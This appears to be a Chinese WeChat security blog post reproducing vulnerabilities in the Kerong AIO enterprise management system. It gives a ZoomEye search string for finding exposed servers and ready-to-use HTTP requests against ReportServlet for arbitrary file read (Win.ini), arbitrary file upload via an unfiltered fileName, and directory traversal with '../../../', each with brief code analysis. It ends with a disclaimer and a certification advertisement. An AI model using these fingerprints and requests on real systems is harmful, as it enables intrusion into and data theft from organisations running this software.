<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9HN5MsfevGq7BMIc5qW0iA)<table width="677"><tbody><tr><td width="557" valign="top" height="62"><h3 cid="n0" mdtype="heading" data-style="margin-top: 1rem; margin-bottom: 1rem; outline: 0px; font-weight: bold; font-size: 1.5em; background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; line-height: 1.43; cursor: text; caret-color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, sans-serif; letter-spacing: normal; text-align: start; visibility: visible;" id="sr-toc-0">免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责。<br></h3></td></tr></tbody></table>

大家可以把安全绘景设为星标，这样就可以及时看到我们最新发布内容啦！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGjEpwZia0LMcjzGKWu8D6NMLoSJoaI9lvBbI6toKhsYwgazQoRUBhp85WU4AQZuQ9sk7JtjcGHiaJA/640?wx_fmt=png)

前言
--

科荣 AIO 企业⼀体化管理解决⽅案 通过 ERPERP（进销存财务）、OAOA（办公⾃动化）、CRMCRM（客⼾关系管理）、UDPUDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP 平台、微信平台、移动 APP 等解决了众多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。

搜索引擎
----

**ZoomEye: "changeAccount('8000')"**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3JD0ZDuhjPvdvRsmA8AgKmf9oLiciaZ9vCrSOibaEJftY26hCV2icWvRkMQ/640?wx_fmt=png&from=appmsg)

漏洞复现
----

### 新版本

### 任意文件读取

```
http://xxxxx/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3XjtzhfTA3Q4yBGAcuryDkKvH6yGziczePvic1a8oVSOIUkOaS1g5P2yQ/640?wx_fmt=png&from=appmsg)

##### 代码分析

当`operation`的值为`getPicFile`，将传入的`fileName`参数值进行判断是否以`"/DISK"`开头并且不为空，如果不为空并以`"/DISK"`开头进行截取如：`/DISKC/Windows/Win.ini ==>DISKC/Windows/Win.ini`，接着判断是否`"DISK"`开头, 如果不为空并以`"DISK"`开头又进行截取然后拼接`:` 如`DISKC/Windows/Win.ini`==>`C:/Windows/Win.ini`最后进行文件读取下载。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3owoNSLV4gibC0rXKLofdHrVkYAkNKfc3HIPicGa4EzlSXXyJguCpXOQw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3NEoyAft4FFtRx95M5kyC9boWEIicZROIYwuXiaIGkHhNdU1EIYM4D61Q/640?wx_fmt=png&from=appmsg)

### 老版本

#### 任意文件上传

```
POST /ReportServlet?operation=saveFormatFile&fileName=demo.css&language= HTTP/1.1
Host: xxxxxx
Connection: lose
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
demo

```

#### ![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3QQqpb5X64OBeYOMD5G92Racr1j5MnQk5LjVgDvgAVDFcPKer3qicOLA/640?wx_fmt=png&from=appmsg)

##### 代码分析

代码很直接获取 POST 输入流将内容写到指定`fileName`中，由于`fileName`未进行过滤导致可以进行越级上传。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn31HBzKfA0GZEIAib2cXXB5O4H7DRU1mT31riaTIAmVPrWfQvllpOxdFiaQ/640?wx_fmt=png&from=appmsg)

#### 目录遍历

```
http://xxxxxx/ReportServlet?operation=getFileList&path=../../../

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3qEqAwYqQuX3GmCdVu6rn7Aq6BXliaUugkOEDVMfvoN4HvI0sO2TV0RQ/640?wx_fmt=png&from=appmsg)

##### 代码分析

直接将`path`带入进行拼接然后遍历输出。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hiauU5HOHMaGFAeyHj0MEib8jWYe14Krn3XxdjLznWIYAE8kicDDfgHqL0Ifx0dO6VjqK95HLp2NKA6YHrHHMXAQw/640?wx_fmt=png&from=appmsg)

**信 安 考 证**

  

  

需要考以下各类安全证书的可以联系我，价格优惠、组团更便宜

<table><tbody><tr><td width="584" valign="top"><p>CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001...</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/ibxcwMR8shiab09VoCDVT3VCrPmx2B4mo5uLQIOt1DtVsHzyJ2fic1mjRSALCk11iaIBGhOYGtrWTSLO3VZnA8c48A/640?wx_fmt=png&from=appmsg)

  

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

**推荐阅读**

[**内推 | 长亭科技 2024 届秋招开启，附内推码~**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247485366&idx=1&sn=3d640db54867c43cd05b6a9c6a24bd56&chksm=cfe09da7f89714b1dc08219ccf1971a2bf32e4d2c0fc60facb8c7d2c9b2b11cc6d066bb3dca8&scene=21#wechat_redirect)

[**你能拿她学校的 shell，但永远拿不了她的 shell**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247485510&idx=1&sn=292301d0bf6700f1e828f9b95fa454d5&chksm=cfe09257f8971b41b2c12e366c8ca19ec722e314c5f0f1767fc02644d2301ae0ba7229f0e142&scene=21#wechat_redirect)

[**渗透实战 | 记一次简单的 Docker 逃逸 + 反编译 jar 接管云主机**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247485356&idx=1&sn=8e6e955e5a93bac9de3ff428bc2f9e3a&chksm=cfe09dbdf89714abcda8ebf025f0db58833782a7beca9fe0fbd15d78aa3f78e9698525752d7c&scene=21#wechat_redirect)  

[**渗透实战 | NPS 反制之绕过登陆验证**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247485174&idx=1&sn=93bfb002b917b33c43830d2d851403c7&chksm=cfe09ce7f89715f1f53bdcab44cd86040363970f6cff1fd555d428aee5c8e09c65ee506ea241&scene=21#wechat_redirect)

[**渗透实战 | 记一次曲折的 EDU 通杀漏洞挖掘**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247485075&idx=1&sn=9a6074125bdefc9a4be8fe60ab38aadf&chksm=cfe09c82f897159447b0430475ace4f4a3bb7c31e69223521dea0f696ac0ed8f6f63572df48b&scene=21#wechat_redirect)

[**渗透实战 | 记一次 RCE+heapdump 信息泄露引发的血案**](http://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247484929&idx=1&sn=b6edbde5a73a4e4f812f1919cdf36307&chksm=cfe09c10f8971506fc924f59c0669aa3c7da8a836aad0dc582bbe25351a68c4b748891da5120&scene=21#wechat_redirect)  

**免责声明**

由于传播、利用本公众号**藏剑安全**所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号**藏剑安全**及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

好文分享收藏赞一下最美点在看哦
